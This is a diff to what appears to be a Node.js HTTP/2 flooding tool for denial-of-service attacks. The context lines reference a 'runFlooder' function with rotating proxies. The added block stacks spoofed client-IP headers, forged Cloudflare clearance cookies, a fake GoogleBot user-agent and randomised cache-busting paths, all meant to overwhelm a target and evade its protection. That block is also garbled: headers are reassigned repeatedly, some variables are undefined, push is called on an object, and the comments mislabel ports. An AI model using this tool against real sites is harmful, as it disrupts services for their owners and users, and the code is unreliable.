@@ -392,30 +392,157 @@ const net = require("net");
  const Socker = new NetSocket();
  headers[":method"] = "GET";
  headers[":authority"] = parsedTarget.host;
- headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
- headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
- headers["X-Forwarded-For"] = spoofed;
- headers["X-Forwarded-Host"] = spoofed;
- headers["Real-IP"] = spoofed;
- headers["cache-control"] = control;
- headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = "Windows";
- headers["origin"] = "https://" + parsedTarget.host;
- headers["referer"] = "https://" + parsedTarget.host;
- headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["user-agent"] = randstr(15);
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "none";
- headers["TE"] = "trailers";
- headers["Trailer"] = "Max-Forwards";
- headers["sec-fetch-user"] = "?1";
- headers["x-requested-with"] = "XMLHttpRequest";
+headers["x-forwarded-proto"] = "https";
+headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
+headers[":scheme"] = "https";
+headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
+headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
+headers[":authority"] = parsedTarget.host;
+headers["origin"] = parsedTarget.host;
+headers["Content-Type"] = randomHeaders['Content-Type'];
+headers[":scheme"] = "https";
+headers["x-download-options"] = randomHeaders['x-download-options'];
+headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
+headers["X-Forwarded-For"] = spoofed;
+headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
+headers["accept"] = randomHeaders['accept'];
+headers["accept"] = randomHeaders['accept'];
+headers["accept"] = accept;
+headers["accept-language"] = randomHeaders['accept-language'];
+headers["accept-language"] = lang;
+headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
+headers["referer"] = Ref;
+headers["x-cache"] = randomHeaders['x-cache'];
+headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
+headers["accept-encoding"] = randomHeaders['accept-encoding'];
+headers["accept-encoding"] = encoding;
+headers["cache-control"] = randomHeaders['cache-control'];
+headers["x-frame-options"] = randomHeaders['x-frame-options'];
+headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
+headers["x-content-type-options"] = "nosniff";
+headers["X-Forwarded-For"] = spoofed;
+headers["TE"] = "trailers";
+headers["pragma"] = randomHeaders['pragma'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["upgrade-insecure-requests"] = "1";
+headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
+headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
+headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
+headers["X-Forwarded-Proto"] = HTTPS;
+headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
+headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = pl;
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+headers["upgrade-insecure-requests"] = "1";
+headers["vary"] = randomHeaders['vary'];
+headers["x-requested-with"] = "XMLHttpRequest";
+headers["TE"] = trailers;
+headers["set-cookie"] = randomHeaders['set-cookie'];
+headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
+headers["Server"] = randomHeaders['Server'];
+headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
+headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
+headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
+headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
+headers["alt-svc"] = randomHeaders['alt-svc'];
+headers["Via"] = fakeIP;
+headers["sss"] = fakeIP;
+headers["Sec-Websocket-Key"] = fakeIP;
+headers["Sec-Websocket-Version"] = 13;
+headers["Upgrade"] = websocket;
+headers["X-Forwarded-For"] = fakeIP;
+headers["X-Forwarded-Host"] = fakeIP;
+headers["Client-IP"] = fakeIP;
+headers["Real-IP"] = fakeIP;
+headers["Referer"] = randomReferer;
+headers["User-Agent"] = randomHeaders['User-Agent'];
+headers["user-agent"] = uap;
+headers["User-Agent"] = uap;
+headers["CF-Connecting-IP"] = fakeIP;
+headers["CF-RAY"] = "randomRayValue";
+headers["CF-Visitor"] = "{'scheme':'https'}";
+headers["X-Forwarded-For"] = spoofed
+headers["X-Forwarded-For"] = spoofed
+headers["X-Forwarded-For"] = spoofed
+headers[":authority"] = parsedTarget.host;
+headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+headers[":scheme"] = "https";
+headers["x-forwarded-proto"] = "https";
+headers["cache-control"] = "no-cache";
+headers["X-Forwarded-For"] = spoofed;
+headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = "Windows";
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
+headers["referer"] = Ref;
+headers["sec-fetch-mode"] = "navigate"; 
+headers["sec-fetch-dest"] = dest1;
+headers["sec-fetch-user"] = "?1";
+headers["TE"] = "trailers";
+headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
+headers["sec-fetch-site"] = site1;
+headers["x-requested-with"] = "XMLHttpRequest";
+headers.GET = ' / HTTP/2';
+headers[':path'] = parsedTarget.path;
+headers[':scheme'] = 'https';
+headers.Referer = 'https://google.com';
+headers.accept_header = xn;
+headers['accept-language'] = badag;
+headers['accept-encoding'] = enc; 
+headers.Connection = 'keep-alive';
+headers['upgrade-insecure-requests'] = '1';
+headers.TE = 'trailers';
+headers['x-requested-with'] = 'XMLHttpRequest';
+headers['Max-Forwards'] = '10';
+headers.pragma = 'no-cache';
+headers.Cookie = 'cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194'; 
+headers["Real-IP"] = spoofed;
+headers["referer"] = Ref;
+headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
+headers["origin"] = "https://" + parsedTarget.host + ":80"; // Include port 80 in origin header
+headers["Via"] = "1.1 " + parsedTarget.host + ":80"; // Include port 80 in Via header
+headers[":authority"] = parsedTarget.host + ":443"; // Include port 80 in :authority header
+headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
+headers["Via"] = "1.1 " + parsedTarget.host + ":443"; // Include port 80 in Via header
+headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.1 header
+headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.2 header
+headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=7200" });   // Add the http/2 header 
+headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.1 header with port 80
+headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.2 header with port 80
+headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + ":80; ma=7200" });   // Add the http/2 header with port 80
+headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.1 header with port 443
+headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.2 header with port 443
+headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=7200" });        // Add the http/2 header with port 443  
+headers[":authority"] = parsedTarget.host;
+headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+headers[":scheme"] = "https";
+headers["x-forwarded-proto"] = "https";
+headers["cache-control"] = "no-cache";
+headers["X-Forwarded-For"] = spoofed;
+headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = "Windows";
+headers["accept-language"] = lang; 
+headers["accept-encoding"] = encoding;
+headers["upgrade-insecure-requests"] = "1"; 
+headers["accept"] = accept;
+headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
+headers["referer"] = Ref;
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-dest"] = dest1;
+headers["sec-fetch-user"] = "?1";
+headers["TE"] = "trailers";
+headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
+headers["sec-fetch-site"] = site1;
+headers["x-requested-with"] = "XMLHttpRequest";
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
